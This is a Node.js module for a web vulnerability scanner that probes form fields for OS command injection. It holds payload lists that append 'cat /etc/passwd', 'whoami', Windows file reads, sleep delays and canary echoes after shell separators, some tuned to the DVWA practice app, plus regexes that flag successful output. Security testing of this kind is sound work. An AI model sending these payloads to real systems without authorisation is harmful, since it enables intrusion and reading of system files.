const axios = require('axios');
const { URL } = require('url');
const crypto = require('crypto');
const { sendRequest } = require('./httpClient');

// 1. Command Injection Payloads (with DVWA-specific prefixed payloads)
const CMD_PAYLOADS = [
    // Generic (no prefix)
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    "& type C:\\Windows\\win.ini",
    // DVWA Low: IP prefix + separator
    "127.0.0.1; cat /etc/passwd",
    "127.0.0.1 && cat /etc/passwd",
    "127.0.0.1 | cat /etc/passwd",
    // DVWA Medium: strips ; and && but allows |
    "127.0.0.1 |cat /etc/passwd",
    // DVWA High: pipe without space
    "127.0.0.1|cat /etc/passwd",
    // whoami variants
    "127.0.0.1; whoami",
    "127.0.0.1 | whoami",
    "127.0.0.1|whoami",
    "; whoami",
    "| whoami",
    "&& whoami",
];

// 2. Time-Based Blind Payloads
const BLIND_CMD_PAYLOADS = [
    { payload: "; sleep 5", os: "Unix" },
    { payload: "| sleep 5", os: "Unix" },
    { payload: "&& sleep 5", os: "Unix" },
    { payload: "`sleep 5`", os: "Unix" },
    { payload: "$(sleep 5)", os: "Unix" },
    { payload: "& timeout /T 5", os: "Windows" },
    { payload: "127.0.0.1; sleep 5", os: "Unix (DVWA Low)" },
    { payload: "127.0.0.1 | sleep 5", os: "Unix (DVWA Medium)" },
    { payload: "127.0.0.1|sleep 5", os: "Unix (DVWA High)" },
];

// 3. Canary-Based Detection
function getCanaryPayloads(canary) {
    return [
        { payload: `127.0.0.1; echo ${canary}`, os: "Unix" },
        { payload: `127.0.0.1 | echo ${canary}`, os: "Unix" },
        { payload: `127.0.0.1|echo ${canary}`, os: "Unix" },
        { payload: `; echo ${canary}`, os: "Unix" },
        { payload: `| echo ${canary}`, os: "Unix" },
        { payload: `&& echo ${canary}`, os: "Unix" },
        { payload: `\`echo ${canary}\``, os: "Unix" },
        { payload: `$(echo ${canary})`, os: "Unix" },
        { payload: `& echo ${canary}`, os: "Windows" },
    ];
}

// 4. Success Indicators
const CMD_SUCCESS_SIGNS = [
    /root:.*:0:0:/,
    /\[fonts\]/,
    /\[extensions\]/,
    /www-data/,
    /daemon:.*:1:1:/,
];

const WHOAMI_PATTERNS = [
    /www-data/i, /apache/i, /nginx/i, /root/i, /daemon/i, /nobody/i,
];


async function scanForCmdInjection(url, method = 'GET', data = {}, locationDescription, contentType = 'form', httpClient) {
    const vulnerabilities = [];
    let scoreDeduction = 0;
    const client = httpClient || axios;

    let baseUrl = url;
    let originalParams = {};
    try {
        const urlObj = new URL(url);
        baseUrl = urlObj.origin + urlObj.pathname;
        for (const [key, value] of urlObj.searchParams) {
            originalParams[key] = value;
        }
    } catch (e) { }

    // Baseline
    let baselineBody = '';
    try {
        const baseRes = await makeRequest(baseUrl, method, { ...originalParams, ...data }, contentType, client);
        baselineBody = baseRes.body;
    } catch (e) { }

    // --- PHASE 1: Direct Output Detection ---
    for (const payload of CMD_PAYLOADS) {
        let attackData = { ...originalParams, ...data };
        for (let key in data) {
            if (data[key] === 'Submit' || data[key] === 'submit') continue;
            attackData[key] = payload;
        }

        try {
            const response = await makeRequest(baseUrl, method, attackData, contentType, client);
            const body = response.body;

            for (const regex of CMD_SUCCESS_SIGNS) {
                if (regex.test(body) && !regex.test(baselineBody)) {
                    vulnerabilities.push({
                        type: 'OS Command Injection',
                        name: `Remote Code Execution (RCE) [${contentType.toUpperCase()}]`,
                        severity: 'Critical',
                        location: locationDescription,
                        description: `System command executed via ${contentType}. Payload: ${payload}`
                    });
                    scoreDeduction += 30;
                    return { vulnerabilities, scoreDeduction };
                }
            }

            if (payload.includes('whoami')) {
                for (const pattern of WHOAMI_PATTERNS) {
                    if (pattern.test(body) && !pattern.test(baselineBody)) {
                        vulnerabilities.push({
                            type: 'OS Command Injection',
                            name: `RCE via whoami [${contentType.toUpperCase()}]`,
                            severity: 'Critical',
                            location: locationDescription,
                            description: `whoami output detected. Payload: ${payload}`
                        });
                        scoreDeduction += 30;
                        return { vulnerabilities, scoreDeduction };
                    }
                }
            }
        } catch (err) { }
    }

    // --- PHASE 2: Blind Time-Based Detection ---
    for (const item of BLIND_CMD_PAYLOADS) {
        let attackData = { ...originalParams, ...data };
        for (let key in data) {
            if (data[key] === 'Submit' || data[key] === 'submit') continue;
            attackData[key] = item.payload;
        }

        try {
            const startTime = Date.now();
            await makeRequest(baseUrl, method, attackData, contentType, client, 10000);
            const duration = Date.now() - startTime;

            if (duration > 4500) {
                vulnerabilities.push({
                    type: 'OS Command Injection',
                    name: `Blind RCE (Time-Based) [${contentType.toUpperCase()}]`,
                    severity: 'Critical',
                    location: locationDescription,
                    description: `Server delayed ${duration}ms on ${item.os} sleep. Payload: ${item.payload}`
                });
                scoreDeduction += 30;
                return { vulnerabilities, scoreDeduction };
            }
        } catch (err) {
            if (err.code === 'ECONNABORTED') {
                vulnerabilities.push({
                    type: 'OS Command Injection',
                    name: `Blind RCE (Timeout) [${contentType.toUpperCase()}]`,
                    severity: 'Critical',
                    location: locationDescription,
                    description: `Server timed out on ${item.os} sleep. Payload: ${item.payload}`
                });
                scoreDeduction += 30;
                return { vulnerabilities, scoreDeduction };
            }
        }
    }

    // --- PHASE 3: Canary Echo Detection ---
    const canary = 'PhxCanary' + crypto.randomBytes(4).toString('hex');
    const canaryPayloads = getCanaryPayloads(canary);

    for (const item of canaryPayloads) {
        let attackData = { ...originalParams, ...data };
        for (let key in data) {
            if (data[key] === 'Submit' || data[key] === 'submit') continue;
            attackData[key] = item.payload;
        }

        try {
            const response = await makeRequest(baseUrl, method, attackData, contentType, client);
            if (response.body.includes(canary)) {
                vulnerabilities.push({
                    type: 'OS Command Injection',
                    name: `RCE via Echo (Canary) [${contentType.toUpperCase()}]`,
                    severity: 'Critical',
                    location: locationDescription,
                    description: `Unique canary echoed back via ${item.os}. Payload: ${item.payload}`
                });
                scoreDeduction += 30;
                return { vulnerabilities, scoreDeduction };
            }
        } catch (err) { }
    }

    return { vulnerabilities, scoreDeduction };
}

async function makeRequest(url, method, data, contentType, client, timeout) {
    const http = client || axios;
    return sendRequest(http, { url, method, data, contentType, timeout: timeout || 5000 });
}

module.exports = { scanForCmdInjection };
